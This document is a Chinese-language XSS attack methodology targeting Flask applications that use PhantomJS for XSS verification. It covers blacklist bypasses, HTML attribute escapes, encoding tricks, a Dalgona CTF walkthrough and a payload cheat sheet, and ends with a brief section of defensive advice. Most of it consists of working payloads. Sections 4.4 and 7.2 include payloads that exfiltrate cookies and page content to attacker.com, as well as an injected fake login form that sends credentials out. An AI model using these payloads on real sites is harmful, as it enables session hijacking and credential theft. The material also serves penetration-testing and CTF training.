# Flask+PhantomJS XSS 攻击方法论

## 1. 技术概述

### 1.1 漏洞原理

本方法论针对使用 Flask 框架结合 PhantomJS 进行 XSS 验证的 Web 应用。这类应用通常作为 CTF 挑战或安全培训平台，具有以下特征：

- **Flask 后端**：使用 Python 2.7/3.x 和 Flask 框架
- **PhantomJS 验证**：使用已废弃的 PhantomJS 头less 浏览器验证 XSS 是否成功
- **弱黑名单过滤**：仅过滤少量关键词（如 `alert`、`confirm`）
- **无输出编码**：用户输入直接反射到 HTML 中，未进行任何编码

**漏洞本质**：用户输入被直接嵌入到 HTML 属性上下文中，由于缺乏适当的输出编码，攻击者可以注入任意 HTML 和 JavaScript 代码。

### 1.2 适用范围

- Flask 应用使用 PhantomJS 进行 XSS 验证
- 用户输入反射到 HTML 属性上下文（尤其是未引号包裹的属性）
- 存在弱黑名单过滤（仅过滤 `alert`、`confirm` 等少数关键词）
- 无 Content-Security-Policy (CSP) 头
- X-XSS-Protection 被显式禁用

### 1.3 读者对象

- 渗透测试工程师
- 安全研究人员
- CTF 参赛者
- Web 应用安全审计人员

---

## 2. 攻击场景与业务环境

### 2.1 典型应用场景

| 场景类型 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **CTF/XSS 挑战平台** | Dalgona Challenges 等安全培训应用 | 故意设计脆弱的黑名单过滤，用于教学目的 |
| **用户昵称/名称显示** | 用户输入名称后在页面显示 | 名称参数直接反射到 HTML 属性中 |
| **搜索框回显** | 搜索关键词在结果页回显 | 搜索词未编码直接输出 |
| **表单值回显** | 表单验证失败后回显用户输入 | value 属性未正确编码 |

### 2.2 技术环境特征

```
框架：Flask 1.1.4 (或类似版本)
Python 版本：Python 2.7.18 (EOL) 或 Python 3.x
浏览器引擎：PhantomJS (已废弃)
安全头：X-XSS-Protection: 0 (显式禁用)
CSP：无
认证：通常无认证系统（公开访问）
```

### 2.3 代码特征识别

**Flask 应用典型代码模式：**

```python
# 用户输入获取
msg = request.args.get('name', '')

# 弱黑名单检查
if 'alert' in msg.lower() or 'confirm' in msg.lower():
    return "Blocked"

# 直接字符串格式化（无编码）
value = '> {0}'.format(msg)
html = TEMPLATE.format(value)

# PhantomJS  subprocess 调用
proc = subprocess.Popen(["timeout", "5", "phantomjs", "check.js"],
                        stdout=subprocess.PIPE, stdin=subprocess.PIPE)
```

---

## 3. 漏洞探测方法

### 3.1 输入点识别

**重点探测位置：**

1. **URL 参数**：`GET /page?name=<payload>`
2. **表单字段**：尤其是 name、username、search 等字段
3. **HTTP 头部**：User-Agent、Referer、X-Forwarded-For 等

**识别技巧：**

```bash
# 使用 curl 测试参数反射
curl -s "http://target/page?name=test" | grep -i "test"

# 检查 HTML 属性上下文
curl -s "http://target/page?name=test" | grep -E 'value=|name=|id='
```

### 3.2 黑盒测试

#### 3.2.1 基础探测

```bash
# 测试普通文本反射
GET /page?name=TestUser

# 测试 HTML 特殊字符
GET /page?name=<test>

# 测试引号闭合
GET /page?name=">test

# 测试事件处理器
GET /page?name=<img src=x onerror=alert(1)>
```

#### 3.2.2 黑名单探测

```bash
# 测试 alert 关键词
GET /page?name=<script>alert(1)</script>

# 测试 confirm 关键词
GET /page?name=confirm(1)

# 测试大小写绕过
GET /page?name=AlErT(1)
GET /page?name=ALERT(1)

# 测试替代函数
GET /page?name=prompt(1)
GET /page?name=print(1)
```

#### 3.2.3 上下文判断

通过响应内容判断注入位置：

| 响应特征 | 注入上下文 | 利用方式 |
|---------|-----------|---------|
| `value="TestUser"` | HTML 属性（双引号内） | `" onclick="...` |
| `value=TestUser>` | HTML 属性（无引号） | `> <img src=x onerror=...` |
| `>TestUser<` | HTML 标签体 | `<script>...</script>` |
| `//TestUser` | JavaScript 注释 | `;alert(1);//` |

### 3.3 白盒测试

**代码审计关键词：**

```python
# 搜索危险函数
request.args.get
request.form.get
.format(  # 字符串格式化
cgi.escape  # Python 2 的弱编码函数

# 搜索 PhantomJS 调用
subprocess.Popen
phantomjs
check.js

# 搜索黑名单
'alert'
'confirm'
blacklist
filter
```

---

## 4. 漏洞利用方法

### 4.1 黑名单绕过技术

#### 4.1.1 替代对话框函数

由于黑名单通常只过滤 `alert` 和 `confirm`，可使用其他函数：

```javascript
// prompt 函数（通常不被过滤）
<img src=x onerror=prompt(1)>

// print 函数
<img src=x onerror=print()>

// 使用 eval+atob 编码
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

#### 4.1.2 事件处理器注入

```html
<!-- img 标签 onerror 事件 -->
<img src=x onerror=prompt(document.domain)>

<!-- svg 标签 onload 事件 -->
<svg onload=prompt(1)>

<!-- body 标签 onload 事件 -->
<body onload=prompt(1)>

<!-- input 标签 onfocus 事件（使用 autofocus 自动触发） -->
<input onfocus=prompt(1) autofocus>
```

#### 4.1.3 字符串拼接绕过

```javascript
// 字符串拼接绕过关键词过滤
<img src=x onerror=window['ale'+'rt'](1)>
<img src=x onerror=self['conf'+'irm'](1)>

// 使用 fromCharCode
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
```

### 4.2 HTML 属性上下文逃逸

#### 4.2.1 无引号属性逃逸

当属性值未使用引号包裹时：

```html
<!-- 原始 HTML -->
<input type=text name=name value=USER_INPUT>

<!-- 注入 Payload -->
"> <img src=x onerror=prompt(1)>

<!-- 结果 HTML -->
<input type=text name=name value=""> <img src=x onerror=prompt(1)>>
```

#### 4.2.2 双引号属性逃逸

```html
<!-- 原始 HTML -->
<input type=text name=name value="USER_INPUT">

<!-- 注入 Payload -->
" onclick="prompt(1)" x="

<!-- 结果 HTML -->
<input type=text name=name value="" onclick="prompt(1)" x="">
```

#### 4.2.3 单引号属性逃逸

```html
<!-- 原始 HTML -->
<input type=text name=name value='USER_INPUT'>

<!-- 注入 Payload -->
' onfocus='prompt(1)' x='

<!-- 结果 HTML -->
<input type=text name=name value='' onfocus='prompt(1)' x=''>
```

### 4.3 PhantomJS 特定绕过

#### 4.3.1 PhantomJS 检测机制

PhantomJS 通常通过以下方式检测 XSS：

```javascript
// check.js 典型逻辑
page.onAlert = function(msg) {
    console.log('ALERT:' + msg);
};
page.onConfirm = function(msg) {
    console.log('CONFIRM:' + msg);
};
page.onPrompt = function(msg) {
    console.log('PROMPT:' + msg);
};
```

#### 4.3.2 绕过验证获取 Flag

```bash
# 使用 prompt 触发（如果应用只过滤 alert/confirm）
GET /page?name=<img src=x onerror=prompt("flag")>

# 使用 autofocus 自动触发
GET /page?name=<input autofocus onfocus=prompt(document.domain)>

# 使用 SVG 事件
GET /page?name=<svg onload=prompt("XSS")>
```

### 4.4 数据外带攻击

#### 4.4.1 使用 fetch 外带数据

```javascript
// 外带页面内容
<img src=x onerror="fetch('http://attacker.com/exfil',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({
        title:document.title,
        content:document.body.innerText,
        url:window.location.href
    })
})">
```

#### 4.4.2 使用 Image Beacon 外带

```javascript
// 简单的外带方式（适用于短数据）
<img src=x onerror="new Image().src='http://attacker.com/log?data='+encodeURIComponent(document.cookie)">
```

#### 4.4.3 凭证钓鱼攻击

```javascript
// 注入钓鱼表单
<img src=x onerror="
document.body.innerHTML='<h2>Session Expired</h2>'+
'<form id=phish>'+
'<input name=user placeholder=Username><br>'+
'<input name=pass type=password placeholder=Password><br>'+
'<button>Login</button>'+
'</form>';
document.getElementById('phish').onsubmit=function(e){
    e.preventDefault();
    fetch('http://attacker.com/steal',{
        method:'POST',
        body:JSON.stringify({
            u:this.user.value,
            p:this.pass.value
        })
    });
};
">
```

---

## 5. 绕过方法与高级技术

### 5.1 字符过滤绕过

#### 5.1.1 空格绕过

```javascript
// 使用/代替空格
<img/src=x/onerror=prompt(1)>

// 使用注释代替空格
<img<!--comment-->src=x onerror=prompt(1)>

// 使用 0x0c 字符（Form Feed）
<img src=x onerror=prompt(1)>
```

#### 5.1.2 括号绕过

```javascript
// 使用数组语法
<img src=x onerror=alert`1`>

// 使用 eval 包装
<img src=x onerror=eval('alert(1)')>
```

#### 5.1.3 引号绕过

```javascript
// 使用反引号（Template Literals）
<img src=x onerror=alert`XSS`>

// 使用 String.fromCharCode
<img src=x onerror=alert(String.fromCharCode(88,83,83))>

// 使用数组 join
<img src=x onerror=alert(['X','S','S'].join(''))>
```

### 5.2 标签过滤绕过

#### 5.2.1 双写绕过

```bash
# 如果应用移除 <script> 中的 < 和 >
GET /page?name=<scr<script>ipt>alert(1)</scr<script>ipt>
```

#### 5.2.2 编码绕过

```javascript
// URL 编码
%3Cimg%20src=x%20onerror=alert(1)%3E

// HTML 实体编码
&lt;img src=x onerror=alert(1)&gt;

// Unicode 编码
\u003cimg src=x onerror=alert(1)\u003e
```

### 5.3 无回显利用

#### 5.3.1 DNSLog 外带

```javascript
// 使用 DNSLog 确认执行
<img src=x onerror="fetch('http://'+document.domain+'.dnslog.cn')">
```

#### 5.3.2 时间延迟探测

```javascript
// 使用时间延迟确认执行（适用于盲测）
<img src=x onerror="var s=new Date();while(new Date()-s<5000);">
```

---

## 6. 完整攻击链

### 6.1 攻击流程

```
1. 信息收集
   └── 识别 Flask 应用和 PhantomJS 使用
   └── 确认无认证系统
   └── 检查安全头缺失

2. 输入点探测
   └── 测试 URL 参数反射
   └── 确定 HTML 上下文
   └── 探测黑名单规则

3. Payload 构造
   └── 选择合适的事件处理器
   └── 构造属性逃逸 Payload
   └── 绕过黑名单过滤

4. 漏洞验证
   └── 触发 JavaScript 对话框
   └── 确认 XSS 成功执行
   └── 获取 Flag/敏感信息

5. 深入利用
   └── 数据外带
   └── 凭证钓鱼
   └── DOM 篡改
```

### 6.2 攻击检查清单

| 步骤 | 检查项 | 工具/命令 |
|-----|-------|----------|
| 1 | 确认 Flask 应用 | `curl -I http://target` 检查 Server 头 |
| 2 | 测试参数反射 | `curl "http://target/page?name=test"` |
| 3 | 确定上下文 | 查看 HTML 源码中 test 的位置 |
| 4 | 测试黑名单 | 尝试 `<script>alert(1)</script>` |
| 5 | 构造 Payload | 根据上下文选择合适的事件处理器 |
| 6 | 验证执行 | 使用浏览器或 PhantomJS 确认 |
| 7 | 数据外带 | 设置监听服务器接收外带数据 |

---

## 7. 实战案例

### 7.1 案例：Dalgona Challenges XSS 挑战

**目标环境：**
- URL: `http://localhost:37575/page?name=<payload>`
- 黑名单：`alert`、`confirm`（大小写不敏感）
- PhantomJS 验证：检测 alert/confirm/prompt 对话框

**攻击步骤：**

```bash
# 步骤 1: 基础探测
curl "http://localhost:37575/page?name=test"
# 响应中包含：value="> test"

# 步骤 2: 确认黑名单
curl "http://localhost:37575/page?name=<script>alert(1)</script>"
# 响应：Sorry you can't use: 'alert'

# 步骤 3: 使用 prompt 绕过
curl "http://localhost:37575/page?name=<img src=x onerror=prompt(1)>"
# 成功触发 prompt 对话框

# 步骤 4: 获取 Flag
curl "http://localhost:37575/page?name=<img src=x onerror=prompt(document.domain)>"
# PhantomJS 检测到 prompt 触发，返回 Flag
```

### 7.2 常用 Payload 速查表

| 目的 | Payload | 说明 |
|-----|--------|------|
| 基础测试 | `<img src=x onerror=prompt(1)>` | 绕过 alert 黑名单 |
| 属性逃逸 | `"> <img src=x onerror=prompt(1)>` | 闭合无引号属性 |
| 双引号逃逸 | `" onclick="prompt(1)" x="` | 闭合双引号属性 |
| 单引号逃逸 | `' onfocus='prompt(1)' x='` | 闭合单引号属性 |
| 无标签注入 | `" onerror="prompt(1)"` | 直接注入事件处理器 |
| autofocus | `<input autofocus onfocus=prompt(1)>` | 自动触发事件 |
| SVG 注入 | `<svg onload=prompt(1)>` | 使用 SVG 标签 |
| 编码绕过 | `<img src=x onerror=eval(atob('YWxlcnQoMSk='))>` | Base64 编码 |
| 字符串拼接 | `<img src=x onerror=window['ale'+'rt'](1)>` | 绕过关键词 |
| 数据外带 | `<img src=x onerror="fetch('http://attacker.com/log',{method:'POST',body:document.cookie})">` | 外带 Cookie |

---

## 8. 防御建议

### 8.1 输出编码

```python
# 使用正确的编码函数
import html

# HTML 属性编码
safe_value = html.escape(user_input, quote=True)

# 或使用 Jinja2 模板自动编码
from flask import render_template_string
render_template_string('<input value="{{ name }}">', name=user_input)
```

### 8.2 输入验证

```python
# 白名单验证
import re
if not re.match(r'^[a-zA-Z0-9_]+$', user_input):
    return "Invalid input"
```

### 8.3 安全头配置

```python
# 设置 CSP
@app.after_request
def set_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

### 8.4 移除 PhantomJS

- PhantomJS 已于 2018 年停止维护，存在已知漏洞
- 使用现代无头浏览器（如 Puppeteer、Playwright）替代
- 避免将用户输入传递给浏览器引擎

---

## 9. 参考资源

- [OWASP XSS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Payloads](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [PhantomJS Security Issues](https://github.com/ariya/phantomjs/issues)
- [Flask Security Best Practices](https://flask.palletsprojects.com/en/stable/security/)
